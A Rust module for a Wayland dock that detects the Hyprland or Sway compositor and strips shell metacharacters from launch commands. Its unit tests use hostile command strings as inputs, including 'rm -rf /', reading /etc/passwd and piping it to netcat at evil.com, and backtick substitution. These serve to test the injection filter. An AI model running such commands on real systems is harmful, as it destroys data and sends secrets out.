//! Compositor-neutral IPC abstraction.
//!
//! All window-manager IPC flows through the [`Compositor`] trait. Backends
//! for Hyprland, Sway, and a no-op fallback are private implementation
//! details; consumers call [`init_or_exit`] or [`init_or_null`] to get a
//! trait object and only interact with the trait methods and the `Wm*`
//! types from this module.

mod hyprland;
mod null;
mod sway;
mod traits;
mod types;

use crate::error::{DockError, Result};
use null::NullCompositor;
pub use traits::{Compositor, WmEventStream};
pub use types::{WmClient, WmEvent, WmMonitor, WmWorkspace};

/// Supported compositor backends.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum CompositorKind {
    Hyprland,
    Sway,
}

/// CLI `--wm` flag values. `Uwsm` is a launch wrapper that falls through
/// to auto-detection of the actual compositor.
///
/// Variants serialize as kebab-case strings — `"hyprland"` / `"sway"` /
/// `"uwsm"` — matching clap's ValueEnum lowercasing, so the same wire
/// format works for both CLI and config-file consumers (e.g.,
/// jasonherald/nwg-dock#33).
#[derive(
    Debug, Clone, Copy, PartialEq, Eq, clap::ValueEnum, serde::Serialize, serde::Deserialize,
)]
#[serde(rename_all = "kebab-case")]
pub enum WmOverride {
    /// Force the Hyprland backend regardless of environment.
    Hyprland,
    /// Force the Sway backend regardless of environment.
    Sway,
    /// Universal Wayland Session Manager — launch wrapper, not a compositor.
    /// Detection falls through to the `HYPRLAND_INSTANCE_SIGNATURE` / `SWAYSOCK`
    /// env vars as usual.
    Uwsm,
}

/// Auto-detect the running compositor from environment variables.
/// Pass `wm_override` to force a specific backend (from `--wm` flag).
pub(crate) fn detect(wm_override: Option<WmOverride>) -> Result<CompositorKind> {
    if let Some(wm) = wm_override {
        match wm {
            WmOverride::Hyprland => return Ok(CompositorKind::Hyprland),
            WmOverride::Sway => return Ok(CompositorKind::Sway),
            WmOverride::Uwsm => {
                crate::launch::set_uwsm_mode(true);
                log::debug!("uwsm mode enabled, auto-detecting compositor from environment");
            }
        }
    }

    if std::env::var("HYPRLAND_INSTANCE_SIGNATURE").is_ok() {
        Ok(CompositorKind::Hyprland)
    } else if std::env::var("SWAYSOCK").is_ok() {
        Ok(CompositorKind::Sway)
    } else {
        Err(DockError::NoCompositorDetected)
    }
}

/// Create a compositor backend for the given kind.
pub(crate) fn create(kind: CompositorKind) -> Result<Box<dyn Compositor>> {
    match kind {
        CompositorKind::Hyprland => Ok(Box::new(hyprland::HyprlandBackend::new()?)),
        CompositorKind::Sway => Ok(Box::new(sway::SwayBackend::new()?)),
    }
}

/// Detects and creates the compositor backend, exiting the process on failure.
///
/// Used by dock and notifications which require full compositor IPC.
pub fn init_or_exit(wm_override: Option<WmOverride>) -> Box<dyn Compositor> {
    let kind = match detect(wm_override) {
        Ok(k) => k,
        Err(e) => {
            log::error!("{}", e);
            std::process::exit(1);
        }
    };
    match create(kind) {
        Ok(c) => c,
        Err(e) => {
            log::error!("{}", e);
            std::process::exit(1);
        }
    }
}

/// Detects and creates the compositor backend, falling back to NullCompositor
/// on failure instead of exiting. Used by nwg-drawer so it can run on any
/// compositor (Niri, river, Openbox, etc.) with graceful feature degradation.
///
/// Logs a warning at the fallback point so the user knows they're running
/// degraded — silent fallback masked the issue for `nwg-dock`'s
/// `init_or_exit` → `init_or_null` switch in jasonherald/nwg-dock#4.
pub fn init_or_null(wm_override: Option<WmOverride>) -> Box<dyn Compositor> {
    match detect(wm_override) {
        Ok(kind) => match create(kind) {
            Ok(c) => c,
            Err(e) => {
                log::warn!(
                    "Compositor backend failed: {} — falling back to NullCompositor. \
                     Live features (event reactions, autohide, workspace switcher) \
                     will be inactive.",
                    e
                );
                Box::new(NullCompositor)
            }
        },
        Err(e) => {
            log::warn!(
                "Compositor detection failed: {}. No supported compositor detected \
                 (no HYPRLAND_INSTANCE_SIGNATURE / SWAYSOCK in env). Falling back to \
                 NullCompositor — live features (event reactions, autohide, workspace \
                 switcher) will be inactive. Pinned apps and click-to-launch still work.",
                e
            );
            Box::new(NullCompositor)
        }
    }
}

/// Sanitizes a command string before passing to compositor exec.
///
/// Strips characters that could be used for command injection via
/// compositor IPC (semicolons chain commands, newlines start new commands,
/// backticks/dollar signs enable substitution).
pub(crate) fn sanitize_exec_command(cmd: &str) -> String {
    cmd.chars()
        .filter(|c| !matches!(c, ';' | '`' | '$' | '|' | '&' | '\n' | '\r'))
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detect_sway_override() {
        assert_eq!(
            detect(Some(WmOverride::Sway)).unwrap(),
            CompositorKind::Sway
        );
    }

    #[test]
    fn detect_hyprland_override() {
        assert_eq!(
            detect(Some(WmOverride::Hyprland)).unwrap(),
            CompositorKind::Hyprland
        );
    }

    #[test]
    fn detect_uwsm_falls_through_to_env() {
        // uwsm is a launch wrapper — detect() falls through to env auto-detect.
        // On a dev machine with Hyprland/Sway running, this finds the compositor.
        // In CI (no WM env vars), this returns NoCompositorDetected.
        // Either way, it must NOT return UnsupportedCompositor.
        let result = detect(Some(WmOverride::Uwsm));
        assert!(
            !matches!(result, Err(DockError::UnsupportedCompositor(_))),
            "uwsm should not be rejected as unsupported, got {:?}",
            result
        );
        // Reset global side effect
        crate::launch::set_uwsm_mode(false);
    }

    #[test]
    fn sanitize_strips_semicolons() {
        assert_eq!(
            sanitize_exec_command("firefox; rm -rf /"),
            "firefox rm -rf /"
        );
    }

    #[test]
    fn sanitize_strips_backticks() {
        assert_eq!(sanitize_exec_command("echo `whoami`"), "echo whoami");
    }

    #[test]
    fn sanitize_strips_dollar() {
        assert_eq!(sanitize_exec_command("echo $HOME"), "echo HOME");
    }

    #[test]
    fn sanitize_strips_pipes() {
        assert_eq!(
            sanitize_exec_command("cat /etc/passwd | nc evil.com 80"),
            "cat /etc/passwd  nc evil.com 80"
        );
    }

    #[test]
    fn sanitize_strips_ampersand() {
        assert_eq!(sanitize_exec_command("cmd & bg"), "cmd  bg");
    }

    #[test]
    fn sanitize_strips_newlines() {
        assert_eq!(sanitize_exec_command("cmd\nmalicious"), "cmdmalicious");
    }

    #[test]
    fn sanitize_preserves_normal_commands() {
        let cmd = "firefox --new-window https://example.com";
        assert_eq!(sanitize_exec_command(cmd), cmd);
    }

    #[test]
    fn sanitize_preserves_paths_with_spaces() {
        let cmd = "/usr/bin/my app --arg=value";
        assert_eq!(sanitize_exec_command(cmd), cmd);
    }

    #[test]
    fn wm_override_serde_round_trip() {
        for variant in [WmOverride::Hyprland, WmOverride::Sway, WmOverride::Uwsm] {
            let s = serde_json::to_string(&variant).expect("serialize");
            let parsed: WmOverride = serde_json::from_str(&s).expect("deserialize");
            assert_eq!(variant, parsed);
        }
    }

    #[test]
    fn wm_override_serde_uses_kebab_case() {
        assert_eq!(
            serde_json::to_string(&WmOverride::Hyprland).unwrap(),
            r#""hyprland""#
        );
        assert_eq!(
            serde_json::to_string(&WmOverride::Sway).unwrap(),
            r#""sway""#
        );
        assert_eq!(
            serde_json::to_string(&WmOverride::Uwsm).unwrap(),
            r#""uwsm""#
        );
    }
}
